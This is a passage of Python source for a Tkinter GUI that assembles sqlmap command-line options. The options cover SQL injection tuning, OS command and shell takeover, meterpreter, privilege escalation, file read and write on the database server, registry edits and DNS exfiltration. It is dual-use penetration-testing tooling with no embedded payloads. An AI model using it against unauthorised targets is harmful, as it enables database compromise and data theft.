        if self.chk_answers_var.get() == "on":
            self.e_answers.config(state="normal")
            return f' --answers="{self.e_answers_value.get()}"'

        self.e_answers.config(state="disabled")
        return ""

    # --disable-coloring            Disable console output coloring
    @property
    def f_disable_coloring(self):
        if self.chk_disable_coloring_var.get() == "on":
            return " --disable-coloring"
        return ""

    # -s SESSIONFILE      Save and resume all data retrieved on a session file
    def f_session_file(self):
        if self.chk_session_file_var.get() == "on":
            filename = tkinter.filedialog.askopenfile(mode="r")
            if filename:
                self.e_session_file_var.set(filename.name)
        else:
            self.e_session_file_var.set("")

    # -s SESSIONFILE      Save and resume all data retrieved on a session file
    @property
    def f_read_session_file(self):
        value = self.e_session_file_var.get()
        if value:
            return f' -s "{value}"'
        return ""

    # -t TRAFFICFILE      Log all HTTP traffic into a textual file
    def f_read_traffic_file(self):
        if self.chk_read_traffic_file_var.get() == "on":
            traffic_file = tkinter.filedialog.asksaveasfile(
                mode="w",
                defaultextension=".txt"
            )
            if traffic_file:
                self.e_traffic_file_var.set(traffic_file.name)
        else:
            self.e_traffic_file_var.set("")

    # -t TRAFFICFILE      Log all HTTP traffic into a textual file
    @property
    def f_save_traffic_file(self):
        value = self.e_traffic_file_var.get()
        if value:
            return f' -t "{value}"'
        return ""

    # Open Session FILE
    def f_open_session_file(self):
        session_file = tkinter.filedialog.askopenfile(
            mode="r",
            **self.file_session
        )
        if session_file:
            self.sesTXT.delete("1.0", tkinter.END)
            self.sesTXT.insert(tkinter.END, session_file.read())
            self.sesTXT.mark_set(tkinter.INSERT, "1.0")
            self.sesTXT.focus()

    # Open Traffic FILE
    def f_traffic_file(self):
        traffic_file = tkinter.filedialog.askopenfile(
            mode="r",
            **self.file_traf
        )
        if traffic_file:
            self.sesTXT.delete("1.0", tkinter.END)
            self.sesTXT.insert(tkinter.END, traffic_file.read())
            self.sesTXT.mark_set(tkinter.INSERT, "1.0")
            self.sesTXT.focus()

    def save_req_f(self):
        filename = tkinter.filedialog.asksaveasfilename(**self.file_request_save)
        if filename:
            textoutput = self.reqFile.get("1.0", tkinter.END)
            with open(filename, "w", encoding="utf-8") as file:
                file.write(textoutput)

    def open_req_f(self):
        filename = tkinter.filedialog.askopenfile(mode="r", **self.file_request_save)
        if filename:
            self.reqFile.delete("1.0", tkinter.END)
            self.reqFile.insert(tkinter.END, filename.read())
            self.reqFile.mark_set(tkinter.INSERT, "1.0")
            self.reqFile.focus()

    def open_ini_f(self):
        filename = tkinter.filedialog.askopenfile(mode="r", **self.file_ini)
        if filename:
            self.reqFile.delete("1.0", tkinter.END)
            self.reqFile.insert(tkinter.END, filename.read())
            self.reqFile.mark_set(tkinter.INSERT, "1.0")
            self.reqFile.focus()

    def save_ini_f(self):
        filename = tkinter.filedialog.asksaveasfilename(**self.file_ini)
        if filename:
            textoutput = self.reqFile.get("1.0", tkinter.END)
            with open(filename, "w", encoding="utf-8") as file:
                file.write(textoutput)

    def show_def_log(self, *args):
        load_d_log = self.Lcat.curselection()
        self.d_log_TXT.delete("1.0", tkinter.END)
        if len(load_d_log) == 1:
            file_d_log = ",".join(self.Lcat.get(ind) for ind in load_d_log)
            path = os.path.join(".", "SQM", "PATH_TRAVERSAL", f"{file_d_log}.txt")
            try:
                with open(path, "r", encoding="utf-8", errors="replace") as file:
                    self.d_log_TXT.insert(tkinter.END, file.read())
            except (OSError, IOError):
                self.d_log_TXT.insert(tkinter.END, f"Default-Log-File-Not-Found: {path}")
            self.d_log_TXT.mark_set(tkinter.INSERT, "1.0")
            self.d_log_TXT.focus()
        else:
            self.d_log_TXT.insert(tkinter.END, "Default-Log-File-Empty.")

    def v_file(self):
        load_file = self.e_file_read.get().replace("/", "_")
        load_host = self.read_host()
        path = os.path.join(".", "output", load_host, "files", load_file)
        self.sesTXT.delete("1.0", tkinter.END)
        try:
            if os.path.getsize(path) != 0:
                with open(path, "r", encoding="utf-8", errors="replace") as file:
                    self.sesTXT.insert(tkinter.END, file.read())
                self.sesTXT.mark_set(tkinter.INSERT, "1.0")
                self.sesTXT.focus()
            else:
                self.sesTXT.insert(tkinter.END, "File-Empty.")
        except (IOError, OSError):
            self.sesTXT.insert(tkinter.END, "File-Not-Found.")
        return self.nRoot.select(tab_id=1)

    # --file-read=FILE..  Read a file from the back-end DBMS file system
    @property
    def f_file_read(self):
        if self.chk_file_read_var.get() == "on":
            return f' --file-read="{self.e_file_read.get()}"'
        return ""

    # --file-write=WFILE  Write a local file on the back-end DBMS file system
    def f_file_write(self):
        sql_file_write = self.file_write_var.get()
        if sql_file_write == "on":
            filename = tkinter.filedialog.askopenfile(mode='r', **self.file_write)
            if filename:
                self.e_file_write_var.set(filename.name)
        elif sql_file_write == "off":
            self.e_file_write_var.set("")
        return

    # --file-write=WFILE  Write a local file on the back-end DBMS file system
    @property
    def f_read_file_write(self):
        value = self.e_file_write_var.get()
        if value:
            return f' --file-write="{value}"'
        return ""

    # --file-dest=DFILE   Back-end DBMS absolute filepath to write to
    @property
    def f_file_dest(self):
        if self.chk_file_dest_var.get() == "on":
            return f' --file-dest="{self.e_file_dest.get()}"'
        return ""

    # --os-cmd=OSCMD      Execute an operating system command
    @property
    def f_os_cmd(self):
        if self.chk_os_cmd_var.get() == "on":
            return f' --os-cmd="{self.e_os_cmd.get()}"'
        return ""

    # --os-shell          Prompt for an interactive operating system shell
    @property
    def f_os_shell(self):
        if self.chk_os_shell_var.get() == "on":
            return " --os-shell"
        return ""

    # --os-pwn            Prompt for an out-of-band shell, meterpreter or VNC
    @property
    def f_os_pwn(self):
        if self.chk_os_pwn_var.get() == "on":
            return " --os-pwn"
        return ""

    # --os-smbrelay       One click prompt for an OOB shell, meterpreter or VNC
    @property
    def f_os_smbrelay(self):
        if self.chk_os_smbrelay_var.get() == "on":
            return " --os-smbrelay"
        return ""

    # --os-bof            Stored procedure buffer overflow exploitation
    @property
    def f_os_bof(self):
        if self.chk_os_bof_var.get() == "on":
            return " --os-bof"
        return ""

    # --priv-esc          Database process' user privilege escalation
    @property
    def f_priv_esc(self):
        if self.chk_priv_esc_var.get() == "on":
            return " --priv-esc"
        return ""

    # --msf-path=MSFPATH  Local path where Metasploit Framework is installed
    def f_msf_path(self):
        if self.chk_msf_path_var.get() == "on":
            value = tkinter.filedialog.askdirectory()
            if value:
                self.e_msf_path_var.set(value)
        else:
            self.e_msf_path_var.set("")

    # --msf-path=MSFPATH  Local path where Metasploit Framework is installed
    @property
    def f_read_msf_path(self):
        if self.chk_msf_path_var.get() == "on":
            return f' --msf-path="{self.e_read_msf_path.get()}"'
        return ""

    # --tmp-path=TMPPATH  Remote absolute path of temporary files directory
    @property
    def f_tmp_path(self):
        if self.chk_tmp_path_var.get() == "on":
            return f' --tmp-path="{self.e_tmp_path.get()}"'
        return ""

    # --reg-read          Read a Windows registry key value
    @property
    def f_reg_read(self):
        if self.chk_reg_read_var.get() == "on":
            return " --reg-read"
        return ""

    # --reg-add           Write a Windows registry key value data
    @property
    def f_reg_add(self):
        if self.chk_reg_add_var.get() == "on":
            return " --reg-add"
        return ""

    # --reg-del           Delete a Windows registry key value
    @property
    def f_reg_del(self):
        if self.chk_reg_del_var.get() == "on":
            return " --reg-del"
        return ""

    # --reg-key=REGKEY    Windows registry key
    @property
    def f_reg_key(self):
        if self.chk_reg_key_var.get() == "on":
            return f' --reg-key="{self.e_reg_key.get()}"'
        return ""

    # --reg-value=REGVAL  Windows registry key value
    @property
    def f_reg_value(self):
        if self.chk_reg_value_var.get() == "on":
            return f' --reg-value="{self.e_reg_value.get()}"'
        return ""

    # --reg-data=REGDATA  Windows registry key value data
    @property
    def f_reg_data(self):
        if self.chk_reg_data_var.get() == "on":
            return f' --reg-data="{self.e_reg_data.get()}"'
        return ""

    # --reg-type=REGTYPE  Windows registry key value type
    @property
    def f_reg_type(self):
        if self.chk_reg_type_var.get() == "on":
            return f' --reg-type="{self.e_reg_type.get()}"'
        return ""

    # --api
    @property
    def f_api(self):
        if self.chk_api_var.get() == "on":
            return " --api"
        return ""

    # --taskid
    @property
    def f_task_id(self):
        if self.chk_api_var.get() == "on" and self.chk_task_id_var.get() == "on":
            value = self.api_task_id_value.get().strip()
            if value:
                return self._openapi_argument("taskid", value)
        return ""

    # --database
    @property
    def f_database(self):
        if self.chk_api_var.get() == "on" and self.chk_database_var.get() == "on":
            value = self.api_database_value.get().strip()
            if value:
                return self._openapi_argument("database", value)
        return ""

    # --sql-query=QUERY   SQL statement to be executed
    def f_sql_query(self, *args):
        if self.chk_sql_query_var.get() == "on":
            self.e_sql_query.config(state="normal")
            return f' --sql-query="{self.e_sql_query.get()}"'

        self.e_sql_query.config(state="disabled")
        return ""

    # --data=DATA         Data string to be sent through POST
    @property
    def f_data(self):
        if self.chk_data_var.get() == "on":
            return f' --data="{self.e_data.get("1.0", "end-1c")}"'
        return ""

    # --param-del=PARA..  Character used for splitting parameter values
    @property
    def f_param_del(self):
        if self.chk_param_del_var.get() == "on":
            return f' --param-del="{self.e_param_del.get()}"'
        return ""

    # --cookie=COOKIE     HTTP Cookie header value
    def f_cookie(self, *args):
        if self.chk_cookie_var.get() == "on":
            self.e_cookie.config(state="normal")
            return f' --cookie="{self.e_cookie.get()}"'

        self.e_cookie.config(state="disabled")
        return ""

    # --live-cookies=L.. Live cookies file used for loading up-to-date values
    def f_live_cookies(self):
        if self.chk_live_cookies_var.get() == "on":
            filename = tkinter.filedialog.askopenfile(mode="r")
            if filename:
                self.var_read_live_cookies.set(filename.name)
        else:
            self.var_read_live_cookies.set("")

    # --live-cookies=L.. Live cookies file used for loading up-to-date values
    @property
    def read_live_cookies(self):
        value = self.var_read_live_cookies.get()
        if value:
            return f' --live-cookies="{value}"'
        return ""

    # --load-cookies=L..  File containing cookies in Netscape/wget format
    def f_load_cookies(self):
        if self.chk_load_cookies_var.get() == "on":
            filename = tkinter.filedialog.askopenfile(mode="r")
            if filename:
                self.var_read_load_cookies.set(filename.name)
        else:
            self.var_read_load_cookies.set("")

    # --load-cookies=L..  File containing cookies in Netscape/wget format
    @property
    def read_load_cookies(self):
        value = self.var_read_load_cookies.get()
        if value:
            return f' --load-cookies="{value}"'
        return ""

    # --drop-set-cookie   Ignore Set-Cookie header from response
    @property
    def f_drop_set_cookie(self):
        if self.chk_drop_set_sookie_var.get() == "on":
            return " --drop-set-cookie"
        return ""

    # --http1
    @property
    def f_http1(self):
        if self.chk_http1_var.get() == "on":
            return " --http1.0"
        return ""

    # --http2
    @property
    def f_http2(self):
        if self.chk_http2_var.get() == "on":
            return " --http2"
        return ""

    # --randomize=RPARAM  Randomly change value for given parameter(s)
    def f_randomize(self, *args):
        if self.chk_randomize_var.get() == "on":
            self.e_randomize.config(state="normal")
            return f' --randomize="{self.e_randomize.get()}"'

        self.e_randomize.config(state="disabled")
        return ""

    # --force-ssl         Force usage of SSL/HTTPS requests
    @property
    def f_force_ssl(self):
        if self.chk_force_ssl_var.get() == "on":
            return " --force-ssl"
        return ""

    # --random-agent     Use randomly selected HTTP User-Agent header
    @property
    def f_random_agent(self):
        if self.chk_random_agent_var.get() == "on":
            return " --random-agent"
        return ""

    # --proxy-cred=PCRED  HTTP proxy authentication credentials (name:password)
    def f_proxy_cred(self, *args):
        if self.chk_proxy_cred_var.get() == "on":
            self.e_proxy_cred.config(state="normal")
            return f' --proxy-cred="{self.e_proxy_cred.get()}"'

        self.e_proxy_cred.config(state="disabled")
        return ""

    # --ignore-proxy      Ignore system default HTTP proxy
    @property
    def f_ignore_proxy(self):
        if self.chk_ignore_proxy_var.get() == "on":
            return " --ignore-proxy"
        return ""

    # --ignore-redirects    Ignore redirection attempts
    @property
    def f_ignore_redirects(self):
        if self.chk_ignore_redirects_var.get() == "on":
            return " --ignore-redirects"
        return ""

    # --ignore-timeouts   Ignore connection timeouts
    @property
    def f_ignore_timeouts(self):
        if self.chk_ignore_timeouts_var.get() == "on":
            return " --ignore-timeouts"
        return ""

    # --proxy-file=PRO..  Load proxy list from a file
    def f_proxy_file(self):
        if self.chk_proxy_file_var.get() == "on":
            filename = tkinter.filedialog.askopenfile(mode="r")
            if filename:
                self.chk_read_proxy_file_var.set(filename.name)
        else:
            self.chk_read_proxy_file_var.set("")

    # --proxy-file=PRO..  Load proxy list from a file
    @property
    def f_read_proxy_file(self):
        value = self.chk_read_proxy_file_var.get()
        if value:
            return f' --proxy-file="{value}"'
        return ""

    # --proxy-freq=PRO.. Requests between change of proxy from a given list
    def f_proxy_freq(self, *args):
        if self.chk_proxy_freq_var.get() == "on":
            self.e_proxy_freq.config(state="normal")
            return f' --proxy-freq="{self.e_proxy_freq.get()}"'

        self.e_proxy_freq.config(state="disabled")
        return ""

    # --hpp               Use HTTP parameter pollution
    @property
    def f_hpp(self):
        if self.chk_hpp_var.get() == "on":
            return " --hpp"
        return ""

    # --cookie-del=COO..  Character used for splitting cookie values
    @property
    def f_cookie_del(self):
        if self.chk_cookie_del_var.get() == "on":
            return f' --cookie-del="{self.e_cookie_del.get()}"'
        return ""

    # --host=HOST         HTTP Host header
    def f_host(self, *args):
        if self.chk_host_var.get() == "on":
            self.e_host.config(state="normal")
            return f' --host="{self.e_host_value.get()}"'

        self.e_host.config(state="disabled")
        return ""

    # --referer=REFERER   HTTP Referer header
    def f_referer(self, *args):
        if self.chk_referer_var.get() == "on":
            self.e_referer.config(state="normal")
            return f' --referer="{self.e_referer_value.get()}"'

        self.e_referer.config(state="disabled")
        return ""

    # --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
    def f_headers(self, *args):
        if self.chk_headers_var.get() == "on":
            self.e_headers.config(state="normal")
            return f' --headers="{self.e_headers_value.get()}"'

        self.e_headers.config(state="disabled")
        return ""

    # --headers=@file.txt load your own txt file with headers
    def f_load_headers(self):
        if self.chk_load_headers_var.get() == "on":
            filename = tkinter.filedialog.askopenfilename(
                initialdir="./SQM/",
                title="broweser_simulation_header",
                filetypes=(("txt files", "*.txt"), ("all files", "*.*")),
            )
            if filename:
                self.var_read_load_headers.set(filename)
        else:
            self.var_read_load_headers.set("")

    # --headers=@file.txt load your own txt file with headers
    @property
    def read_load_headers(self):
        value = self.var_read_load_headers.get()
        if value:
            return f' --headers="{value}"'
        return ""

    # --auth-type=ATYPE   HTTP authentication type (Basic, Digest or NTLM)
    def f_auth_type(self, *args):
        if self.chk_auth_type_var.get() == "on":
            self.e_auth_type.config(state="normal")
            return f' --auth-type="{self.e_auth_type.get()}"'

        self.e_auth_type.config(state="disabled")
        return ""

    # --auth-cred=ACRED   HTTP authentication credentials (name:password)
    def f_auth_cred(self, *args):
        if self.chk_auth_cred_var.get() == "on":
            self.e_auth_cred.config(state="normal")
            return f' --auth-cred="{self.e_auth_cred.get()}"'

        self.e_auth_cred.config(state="disabled")
        return ""

    # --auth-file=AUTH..  HTTP authentication PEM cert/private key file
    def f_auth_file(self):
        if self.chk_auth_file_var.get() == "on":
            filename = tkinter.filedialog.askopenfile(mode="r")
            if filename:
                self.var_auth_file.set(filename.name)
        else:
            self.var_auth_file.set("")

    # --auth-file=AUTH..  HTTP authentication PEM cert/private key file
    @property
    def read_auth_file(self):
        value = self.var_auth_file.get()
        if value:
            return f' --auth-file="{value}"'
        return ""

    # --delay=DELAY       Delay in seconds between each HTTP request
    def f_delay(self, *args):
        if self.chk_delay_var.get() == "on":
            self.e_delay.config(state="normal")
            return f' --delay="{self.e_delay_value.get()}"'

        self.e_delay.config(state="disabled")
        return ""

    # --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
    def f_time_out(self, *args):
        if self.chk_time_out_var.get() == "on":
            self.e_time_out.config(state="normal")
            return f' --timeout="{self.e_time_out.get()}"'

        self.e_time_out.config(state="disabled")
        return ""

    # --retries=RETRIES   Retries when the connection timeouts (default 3)
    def f_retries(self, *args):
        if self.chk_retries_var.get() == "on":
            self.e_retries.config(state="normal")
            return f' --retries="{self.e_retries.get()}"'

        self.e_retries.config(state="disabled")
        return ""

    # --safe-url=SAFURL   Url address to visit frequently during testing
    def f_safe_url(self):
        if self.chk_safe_url_var.get() == "on":
            return f' --safe-url="{self.e_safe_url.get()}"'
        return ""

    # --skip-urlencode    Skip URL encoding of payload data
    @property
    def f_skip_urlencode(self):
        if self.chk_skip_urlencode_var.get() == "on":
            return " --skip-urlencode"
        return ""

    # --eval=EVALCODE Evaluate provided Python code before the request
    def f_eval_code(self, *args):
        if self.chk_eval_code_var.get() == "on":
            self.e_eval_code.config(state="normal")
            return f' --eval="{self.e_eval_code.get()}"'

        self.e_eval_code.config(state="disabled")
        return ""

    # --chunked            Use HTTP chunked transfer encoded (POST) requests
    @property
    def f_chunked(self):
        if self.chk_chunked_var.get() == "on":
            return " --chunked"
        return ""

    # --method=METHOD     Force usage of given HTTP method (e.g. PUT)
    def f_method(self, *args):
        if self.chk_method_var.get() == "on":
            self.e_method.config(state="readonly")
            return f' --method="{self.e_method_value.get()}"'

        self.e_method.config(state="disabled")
        return ""

    # -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
    def f_header(self, *args):
        if self.chk_header_var.get() == "on":
            self.e_header.config(state="normal")
            return f' -H "{self.e_header_value.get()}"'

        self.e_header.config(state="disabled")
        return ""

    # --ignore-code=IG..  Ignore HTTP error code (e.g. 401)
    def f_ignore(self, *args):
        if self.chk_ignore_var.get() == "on":
            self.e_ignore.config(state="normal")
            return f' --ignore-code="{self.e_ignore_value.get()}"'

        self.e_ignore.config(state="disabled")
        return ""

    # --safe-post=SAFE..  POST data to send to a safe URL
    @property
    def f_safe_post(self):
        if self.chk_safe_post_var.get() == "on":
            return f' --safe-post="{self.e_safe_post.get()}"'
        return ""

    # --safe-req=SAFER..  Load safe HTTP request from a file
    @property
    def f_safe_req(self):
        if self.chk_safe_req_var.get() == "on":
            return f' --safe-req="{self.e_safe_req.get()}"'
        return ""

    # --safe-freq=SAFE..  Test requests between two visits to a given safe URL
    @property
    def f_safe_freq(self):
        if self.chk_safe_freq_var.get() == "on":
            return f' --safe-freq="{self.e_safe_freq.get()}"'
        return ""

    # --csrf-token=CSR..  Parameter used to hold anti-CSRF token
    def f_csrf_token(self):
        if self.chk_csrf_token_var.get() == "on":
            return f' --csrf-token="{self.e_csrf_token.get()}"'
        return ""

    # --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit
    def f_csrf_method(self, *args):
        if self.chk_csrf_method_var.get() == "on":
            self.e_csrf_method.config(state="readonly")
            return f' --csrf-method="{self.e_csrf_method_value.get()}"'

        self.e_csrf_method.config(state="disabled")
        return ""

    # --csrf-data=POST data to send during anti-CSRF token page visit
    def f_csrf_data(self, *args):
        if self.chk_csrf_data_method_var.get() == "on":
            return f' --csrf-data="{self.e_csrf_data.get()}"'
        return ""

    # --csrf-retries    Retries for anti-CSRF token retrieval
    def f_csrf_retries(self, *args):
        if self.chk_csrf_retries_var.get() == "on":
            return f' --csrf-retries="{self.e_csrf_retries_value.get()}"'
        return ""

    # --csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token
    @property
    def f_csrf_url(self):
        if self.chk_csrf_url_var.get() == "on":
            return f' --csrf-url="{self.e_csrf_url.get()}"'
        return ""

    # --prefix=PREFIX     Injection payload prefix string
    def f_prefix(self, *args):
        if self.chk_prefix_var.get() == "on":
            self.e_prefix.config(state="normal")
            return f' --prefix="{self.e_prefix_value.get()}"'

        self.e_prefix.config(state="disabled")
        return ""

    # --suffix=SUFFIX     Injection payload suffix string
    def f_suffix(self, *args):
        if self.chk_suffix_var.get() == "on":
            self.e_suffix.config(state="normal")
            return f' --suffix="{self.e_suffix_value.get()}"'

        self.e_suffix.config(state="disabled")
        return ""

    # --os=OS             Force back-end DBMS operating system to this value
    def f_os(self, *args):
        if self.chk_os_var.get() == "on":
            self.e_os.config(state="normal")
            return f' --os="{self.e_os.get()}"'

        self.e_os.config(state="disabled")
        return ""

    # --skip=SKIP         Skip testing for given parameter(s)
    @property
    def f_skip(self):
        if self.chk_skip_var.get() == "on":
            return f' --skip="{self.e_skip.get()}"'
        return ""


    # --invalid-logical   Use logical operations for invalidating values
    @property
    def f_invalid_logical(self):
        if self.chk_invalid_logical_var.get() == "on":
            return " --invalid-logical"
        return ""

    # --invalid-bignum    Use big numbers for invalidating values
    @property
    def f_invalid_bignum(self):
        if self.chk_invalid_bignum_var.get() == "on":
            return " --invalid-bignum"
        return ""

    # --no-cast           Turn off payload casting mechanism
    @property
    def f_no_cast(self):
        if self.chk_no_cast_var.get() == "on":
            return " --no-cast"
        return ""

    # --no-escape         Turn off string escaping mechanism
    @property
    def f_no_escape(self):
        if self.chk_no_escape_var.get() == "on":
            return " --no-escape"
        return ""

    # --invalid-string    Use random strings for invalidating values
    @property
    def f_invalid_string(self):
        if self.chk_invalid_string_var.get() == "on":
            return " --invalid-string"
        return ""

    # --proof     Prove exploitation of the detected injection point(s)
    @property
    def f_proof(self):
        if self.chk_proof_var.get() == "on":
            return " --proof"
        return ""

    # --esperanto         Use the DBMS-agnostic enumeration engine
    @property
    def f_esperanto(self):
        if self.chk_esperanto_var.get() == "on":
            return " --esperanto"
        return ""

    # --string=STRING     String to match when query is evaluated to True
    def f_string(self, *args):
        if self.chk_string_var.get() == "on":
            self.e_string.config(state="normal")
            return f' --string="{self.e_string.get()}"'

        self.e_string.config(state="disabled")
        return ""

    # --not-string=NOT  String to match when query is evaluated to False
    def f_not_string(self, *args):
        if self.chk_not_string_var.get() == "on":
            self.e_not_string.config(state="normal")
            return f' --not-string="{self.e_not_string.get()}"'

        self.e_not_string.config(state="disabled")
        return ""

    # --regexp=REGEXP     Regexp to match when query is evaluated to True
    def f_regexp(self, *args):
        if self.chk_regexp_var.get() == "on":
            self.e_regexp.config(state="normal")
            return f' --regexp="{self.e_regexp.get()}"'

        self.e_regexp.config(state="disabled")
        return ""

    # --code=CODE         HTTP code to match when query is evaluated to True
    def f_code(self, *args):
        if self.chk_code_var.get() == "on":
            self.e_code.config(state="normal")
            return f' --code="{self.e_code_value.get()}"'

        self.e_code.config(state="disabled")
        return ""

    # --lengths           Compare pages based only on their content length
    @property
    def f_lengths(self):
        if self.chk_lengths_var.get() == "on":
            return " --lengths"
        return ""

    # --smart             Conduct through tests only if positive heuristic(s)
    @property
    def f_smart(self):
        if self.chk_smart_var.get() == "on":
            return " --smart"
        return ""

    # --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
    def f_union_cols(self, *args):
        if self.chk_union_cols_var.get() == "on":
            self.e_union_cols.config(state="normal")
            return f' --union-cols="{self.e_union_cols_value.get()}"'

        self.e_union_cols.config(state="disabled")
        return ""

    # --union-char=UCHAR  Character to use for bruteforcing number of columns
    def f_union_char(self, *args):
        if self.chk_union_char_var.get() == "on":
            self.e_union_char.config(state="normal")
            return f' --union-char="{self.e_union_char_value.get()}"'

        self.e_union_char.config(state="disabled")
        return ""

    # --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
    def f_union_from(self, *args):
        if self.chk_union_from_var.get() == "on":
            self.e_union_from.config(state="normal")
            return f' --union-from="{self.e_union_from_value.get()}"'

        self.e_union_from.config(state="disabled")
        return ""

    # --union-values="'foobar',*,1."
    def f_union_values(self, *args):
        if self.chk_union_values_var.get() == "on":
            self.e_union_values.config(state="normal")
            return f' --union-values="{self.e_union_values_value.get()}"'

        self.e_union_values.config(state="disabled")
        return ""

    # --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
    def f_time_sec(self, *args):
        if self.chk_time_sec_var.get() == "on":
            self.e_time_sec.config(state="normal")
            return f' --time-sec="{self.e_time_sec_value.get()}"'

        self.e_time_sec.config(state="disabled")
        return ""

    # -o                  Turn on all optimization switches
    @property
    def f_optimization(self):
        if self.chk_optimization_var.get() == "on":
            return " -o"
        return ""


    # --no-keep-alive     Disable persistent HTTP(s) connections (Keep-Alive)
    @property
    def f_no_keep_alive(self):
        if self.chk_no_keep_alive_var.get() == "on":
            return " --no-keep-alive"
        return ""

    # --null-connection   Retrieve page length without actual HTTP response body
    @property
    def f_null_connection(self):
        if self.chk_null_connection_var.get() == "on":
            return " --null-connection"
        return ""

    # --text-only         Compare pages based only on the textual content
    @property
    def f_text_only(self):
        if self.chk_text_only_var.get() == "on":
            return " --text-only"
        return ""

    # --titles            Compare pages based only on their titles
    @property
    def f_titles(self):
        if self.chk_titles_var.get() == "on":
            return " --titles"
        return ""

    # --batch             Never ask for user input, use the default behaviour
    @property
    def f_batch(self):
        if self.chk_batch_var.get() == "on":
            return " --batch"
        return ""

    # --no-logging          Disable logging to a file
    @property
    def f_no_logging(self):
        if self.chk_no_logging_var.get() == "on":
            return " --no-logging"
        return ""

    # --binary-fields=..  Result fields having binary values (e.g. "digest")
    def f_binary_fields(self, *args):
        if self.chk_binary_fields_var.get() == "on":
            self.e_binary_fields.config(state="normal")
            return f' --binary-fields="{self.e_binary_fields.get()}"'

        self.e_binary_fields.config(state="disabled")
        return ""

    # --hex               Use DBMS hex function(s) for data retrieval
    @property
    def f_hex(self):
        if self.chk_hex_var.get() == "on":
            return " --hex"
        return ""

    # --save=SAVECONFIG   Save options to a configuration INI file
    def f_save(self):
        if self.chk_Save_var.get() == "on":
            save_config_file = tkinter.filedialog.asksaveasfile(
                mode="w",
                defaultextension=".ini"
            )
            if save_config_file:
                self.var_save_config.set(save_config_file.name)
        else:
            self.var_save_config.set("")

    # --save=SAVECONFIG   Save options to a configuration INI file
    @property
    def save_config(self):
        value = self.var_save_config.get()
        if value:
            return f' --save="{value}"'
        return ""

    # --scope=SCOPE       Regexp to filter targets from provided proxy log
    @property
    def f_scope(self):
        if self.chk_scope_var.get() == "on":
            return f' --scope="{self.e_scope.get()}"'
        return ""

    # --har=HARFILE       Log all HTTP traffic into a HAR file
    def f_har(self):
        if self.chk_har_var.get() == "on":
            har_file = tkinter.filedialog.asksaveasfile(
                mode="w",
                defaultextension=".har"
            )
            if har_file:
                self.var_har_file.set(har_file.name)
        else:
            self.var_har_file.set("")

    # --har=HARFILE       Log all HTTP traffic into a HAR file
    @property
    def save_har_file(self):
        value = self.var_har_file.get()
        if value:
            return f' --har="{value}"'
        return ""

    # --report-json=REPORTJSON   Store run results to a JSON file
    def f_report_json(self):
        if self.chk_report_json_var.get() == "on":
            report_json_file = tkinter.filedialog.asksaveasfile(
                mode="w",
                defaultextension=".json"
            )
            if report_json_file:
                self.e_report_json_var.set(report_json_file.name)
        else:
            self.e_report_json_var.set("")

    # --report-json=REPORTJSON   Store run results to a JSON file
    @property
    def save_report_json_file(self):
        value = self.e_report_json_var.get()
        if value:
            return f' --report-json="{value}"'
        return ""

    # -b, --banner        Retrieve DBMS banner
    @property
    def f_banner(self):
        if self.f_banner_var.get() == "on":
            return " --banner"
        return ""

    # -f, --fingerprint   Perform an extensive DBMS version fingerprint
    @property
    def f_finger_print(self):
        if self.chk_finger_print_var.get() == "on":
            return " -f"
        return ""

    # --dbms=DBMS         Force back-end DBMS to this value
    def f_dbms(self, *args):
        if self.chk_dbms_var.get() == "on":
            self.box.config(state="readonly")
            return f' --dbms="{self.box.get()}"'

        self.box.config(state="disabled")
        return ""

    # --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
    def f_dbms_cred(self, *args):
        if self.chk_dbms_cred_var.get() == "on":
            self.e_dbms_cred.config(state="normal")
            return f' --dbms-cred="{self.e_dbms_cred.get()}"'

        self.e_dbms_cred.config(state="disabled")
        return ""

    # -p TESTPARAMETER    Testable parameter(s)
    def f_test_parameter(self, *args):
        if self.chk_test_parameter_var.get() == "on":
            self.e_test_parameter.config(state="normal")
            return f" -p {self.e_test_parameter.get()}"

        self.e_test_parameter.config(state="disabled")
        return ""

    # --param-exclude     Regexp to exclude parameters from testing (e.g. "ses")
    def f_param_exclude(self):
        if self.chkParam_exclude_var.get() == "on":
            return f' --param-exclude="{self.entry_param_exclude.get()}"'
        return ""

    # --level=LEVEL    Level of tests to perform (1-5, default 1)
    def f_level(self, *args):
        if self.chk_level_var.get() == "on":
            self.e_level.config(state="readonly")
            return f' --level="{self.e_level_value.get()}"'

        self.e_level.config(state="disabled")
        return ""

    # --risk=RISK         Risk of tests to perform (1-3, default 1)
    def f_risk(self, *args):
        if self.chk_risk_var.get() == "on":
            self.e_risk.config(state="readonly")
            return f' --risk="{self.e_risk_value.get()}"'

        self.e_risk.config(state="disabled")
        return ""

    # -v VERBOSE            Verbosity level: 0-6 (default 1)
    def f_verbose(self, *args):
        if self.chk_verbose_var.get() == "on":
            self.e_verbose.config(state="readonly")
            return f" -v {self.e_verbose_value.get()}"

        self.e_verbose.config(state="disabled")
        return ""

    # --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
    def f_threads(self, *args):
        if self.chk_threads_var.get() == "on":
            self.threads.config(state="readonly")
            return f' --threads="{self.threads_value.get()}"'

        self.threads.config(state="disabled")
        return ""

    # --technique=TECH    SQL injection techniques to use (default "BEUSTQ")
    def f_technique(self, *args):
        if self.chk_tech_var.get() == "on":
            self.e_technique.config(state="normal")
            return f' --technique="{self.e_technique_value.get()}"'

        self.e_technique.config(state="disabled")
        return ""

    # --dns-domain=DNS..  Domain name used for DNS exfiltration attack
    def f_dns_domain(self, *args):
        if self.chk_dns_domain_var.get() == "on":
            self.e_dns_domain.config(state="normal")
            return f' --dns-domain="{self.e_dns_domain.get()}"'

        self.e_dns_domain.config(state="disabled")
        return ""

    # --second-url=SEC..  Resulting page URL searched for second-order response
    def f_second_url(self, *args):
        if self.chk_second_url_var.get() == "on":
            self.entry_sec_url.config(state="normal")
            return f' --second-url="{self.e_second_url_value.get()}"'

        self.entry_sec_url.config(state="disabled")
        return ""

    # --second-req=SEC..  Load second-order HTTP request from file
    def f_second_req(self, *args):
        if self.chk_second_req_var.get() == "on":
            self.entry_second_req.config(state="normal")
